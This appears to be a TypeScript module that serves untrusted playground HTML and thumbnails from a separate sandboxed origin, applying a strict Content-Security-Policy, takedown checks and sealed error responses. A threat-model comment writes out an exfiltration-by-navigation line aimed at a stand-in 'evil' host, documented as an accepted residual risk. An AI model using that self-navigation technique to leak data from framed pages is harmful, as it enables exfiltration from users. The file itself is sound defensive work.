import type { ArtifactStore, Catalog, ThumbnailStore, VersionId } from '../storage/index.js';
import { PlaygroundId, PlaygroundNotFoundError, currentVersionOf } from '../storage/index.js';
import type { AppOrigin } from './originGuard.js';

// THE SANDBOX ENFORCEMENT BOUNDARY — and the ONLY one. This handler is what runs on the
// CONTENT ORIGIN: a foreign origin from the app, whose entire job is to hand a playground's
// raw, self-contained html to a sandboxed iframe under a strict CSP. Treat every playground
// as hostile code; the store made no safety claims about it, so all the safety is HERE, in
// one place. [LAW:single-enforcer]
//
// The read path is catalog -> version -> store and NEVER touches the provider, so the whole
// commons/use surface works with generation entirely off. [LAW:decomposition]

// The Content-Security-Policy carried on every served playground, as a function of the ONE origin
// permitted to frame it (the app). The intent — deny-all baseline, no network, framed only by the app —
// at full resolution:
//   default-src 'none'   : nothing is allowed unless re-permitted below.
//   script-src/style-src 'unsafe-inline' : a self-contained playground IS inline code; this
//                          is what lets it RUN. It still cannot load any EXTERNAL script or
//                          style (no 'self', no host, no https:) — only its own inline code.
//   img-src/font-src data:: self-contained assets are data: URIs; allow those, nothing more.
//   connect-src 'none'   : the real containment — no fetch/XHR/WebSocket/beacon, so a
//                          hostile playground cannot phone home or exfiltrate.
//   form-action/base-uri 'none' : no posting out, no <base> hijack.
//   frame-ancestors <app origin> : ONLY the app's player may frame a playground — a third party cannot
//                          hotlink/embed it as if their own. It was formerly left unset (any site could
//                          frame). Scoping it to exactly the app origin is defense-in-depth against
//                          embedding abuse; risk was already low (opaque frame + connect-src 'none'), so
//                          this is belt-and-suspenders, not the primary containment.
//
// ACCEPTED RESIDUAL (threat model R3 — outbound navigation): connect-src 'none' stops fetch/XHR/
// WebSocket/beacon, but it does NOT stop the framed document navigating ITSELF away —
// `location = 'https://evil?…'`. The sandbox permits a same-frame navigation, and CSP's `navigate-to`
// directive that would block it is unshipped in browsers. This is DOCUMENTED AND ACCEPTED, not fixed:
// the frame is opaque-origin and holds nothing sensitive (no app cookies, storage, or session), so a
// self-navigation carries nothing worth exfiltrating — the severity is low. If `navigate-to` ships, add
// it here. [LAW:no-silent-failure]
const playgroundCsp = (appOrigin: AppOrigin): string =>
  [
    "default-src 'none'",
    "script-src 'unsafe-inline'",
    "style-src 'unsafe-inline'",
    'img-src data: blob:',
    'font-src data:',
    "connect-src 'none'",
    "form-action 'none'",
    "base-uri 'none'",
    `frame-ancestors ${appOrigin}`,
  ].join('; ');

export interface ContentHandlerDeps {
  readonly catalog: Catalog;
  readonly store: ArtifactStore;
  // The derived-preview cache (render-dax.1), read by the /thumb route. It is the SIBLING of `store`:
  // `store` holds the authoritative html this origin serves raw into the sandbox, `thumbnails` holds the
  // derived PNG the commons card frames as an <img>. Both are addressed by the SAME current version, so
  // a playground's preview and its live bytes always describe the same version. [LAW:one-source-of-truth]
  readonly thumbnails: ThumbnailStore;
  // The app's origin — the ONE origin permitted to frame a served playground, scoped into the CSP's
  // frame-ancestors. The branded AppOrigin type carries the guarantee that this is a VALIDATED bare
  // origin (minted only through appOriginOf/AppOrigin), so an unvalidated string can never reach the
  // frame-ancestors directive. The handler knows "who may frame me" without knowing anything about OAuth.
  // [LAW:types-are-the-program] [LAW:decomposition]
  readonly appOrigin: AppOrigin;
}

export const makeContentHandler = (deps: ContentHandlerDeps): ((request: Request) => Promise<Response>) => {
  const { catalog, store, thumbnails, appOrigin } = deps;
  // The CSP is a value derived once from the app origin (fixed for this handler's life), not a
  // per-request branch. [LAW:dataflow-not-control-flow]
  const csp = playgroundCsp(appOrigin);
  // Every response from the content origin — html, PNG, and errors alike — carries the strict CSP
  // and nosniff. There is no path out of this handler that serves anything permissively. `extra`
  // carries the response-specific headers (a thumbnail's cache directives), MERGED over the seal but
  // never replacing the hardening, so the cross-cutting security headers can't be dropped by a caller.
  //
  // Cacheability is stated ONCE here and DEFAULTS to `no-cache` (revalidate before use): most responses at
  // this origin can CHANGE for the same URL — a "not rendered yet" 404 becomes a 200 when the thumbnail
  // lands, an unlisted 410 becomes a 200 on relist, the raw html changes when a version is refined — so a
  // heuristically-cached copy would pin a stale meaning (a neutral slot after the preview exists, a "removed"
  // page after a put-back). The ONE genuinely-immutable response, the versioned PNG, opts out via `extra`
  // (its URL carries the version, so its bytes never change). Default-safe, explicit-immutable.
  // [LAW:single-enforcer] [FRAMING:representation]
  const sealed = (body: string | Uint8Array, status: number, contentType: string, extra: Record<string, string> = {}): Response =>
    new Response(body, {
      status,
      headers: {
        'cache-control': 'no-cache',
        ...extra,
        'content-type': contentType,
        'content-security-policy': csp,
        'x-content-type-options': 'nosniff',
      },
    });

  // The one place a request id becomes a VISIBLE playground — the shared front of both routes, so the
  // takedown rule lives once. It resolves the id, enforces the listing gate, and returns the current
  // version to key the read by: an unlisted playground STOPS being served (getPlayground still resolves
  // it — existence is monotonic, the report/relist paths depend on that — so this is a visibility check
  // HERE, at the one origin that serves derived-from-untrusted bytes, not a deletion). The two failure
  // MEANINGS are carried as a discriminated result, not a thrown special case: a genuine unknown id and
  // an unlisted takedown each map to their own sealed status at the callsite, and any OTHER fault (an
  // unreadable catalog) propagates to the loud 500 below. [LAW:single-enforcer] [LAW:dataflow-not-control-flow]
  type Resolved = { readonly kind: 'ok'; readonly version: VersionId } | { readonly kind: 'gone' } | { readonly kind: 'unknown' };
  const resolveVisible = async (id: string): Promise<Resolved> => {
    try {
      const playground = await catalog.getPlayground(PlaygroundId(id));
      // 410 Gone: the resource existed and is intentionally no longer available, distinct from a 404
      // (never existed). Enforced identically for the html and the thumbnail, so a takedown that hides
      // the page also hides its preview — one visibility model, no leak through the derived cache.
      if (playground.listing === 'unlisted') return { kind: 'gone' };
      return { kind: 'ok', version: currentVersionOf(playground.session) };
    } catch (error) {
      if (error instanceof PlaygroundNotFoundError) return { kind: 'unknown' };
      throw error;
    }
  };

  // The raw html route — live code served UNESCAPED (contained by sandbox + origin + CSP; escaping it
  // would break the playground, the opposite mistake from escaping app chrome). A missing artifact for a
  // catalogued version is the server being wrong, so store.get fails LOUD into the 500 below, never a 404.
  // [FRAMING:representation] [LAW:no-silent-failure]
  const servePlaygroundHtml = async (id: string): Promise<Response> => {
    const resolved = await resolveVisible(id);
    if (resolved.kind === 'gone') return sealed('this playground has been removed', 410, 'text/plain; charset=utf-8');
    if (resolved.kind === 'unknown') return sealed(`playground not found: ${id}`, 404, 'text/plain; charset=utf-8');
    const artifact = await store.get(resolved.version);
    return sealed(artifact.html, 200, 'text/html; charset=utf-8');
  };

  // The derived-preview route (discovery-rye.3) — the current version's PNG for the commons card. Unlike
  // the html store, an ABSENT thumbnail is not a fault but the honest "not yet rendered": the version is
  // real and usable, its preview merely pending or failed. So it is a 404 the card turns into a neutral
  // slot, never a fabricated image or a loud error. [FRAMING:representation] [LAW:no-silent-failure] A
  // present thumbnail is served with a long, immutable cache: the `v` cache-buster in the card's URL
  // (playgroundThumbnailUrl) advances with the version, so old bytes are never re-requested and the cache
  // never needs invalidating. [LAW:no-ambient-temporal-coupling]
  const servePlaygroundThumbnail = async (id: string): Promise<Response> => {
    const resolved = await resolveVisible(id);
    if (resolved.kind === 'gone') return sealed('this playground has been removed', 410, 'text/plain; charset=utf-8');
    if (resolved.kind === 'unknown') return sealed(`playground not found: ${id}`, 404, 'text/plain; charset=utf-8');
    const png = await thumbnails.get(resolved.version);
    if (png === undefined) return sealed('thumbnail not rendered yet', 404, 'text/plain; charset=utf-8');
    return sealed(png, 200, 'image/png', { 'cache-control': 'public, max-age=31536000, immutable' });
  };

  return async (request: Request): Promise<Response> => {
    const url = new URL(request.url);
    if (request.method !== 'GET' || (url.pathname !== '/' && url.pathname !== '/thumb')) {
      return sealed('not found', 404, 'text/plain; charset=utf-8');
    }
    const id = url.searchParams.get('id');
    if (id === null || id === '') {
      return sealed('missing or empty query parameter: id', 400, 'text/plain; charset=utf-8');
    }
    // The handler stays TOTAL — a genuine read/invariant fault (unreadable catalog, missing artifact for a
    // catalogued version) becomes a loud, still-sealed 500 here rather than propagating unsealed, so every
    // response leaving this origin carries the strict CSP. [LAW:no-silent-failure] [LAW:single-enforcer]
    try {
      return url.pathname === '/thumb' ? await servePlaygroundThumbnail(id) : await servePlaygroundHtml(id);
    } catch (error) {
      const message = error instanceof Error ? error.message : String(error);
      return sealed(`failed to load playground: ${message}`, 500, 'text/plain; charset=utf-8');
    }
  };
};
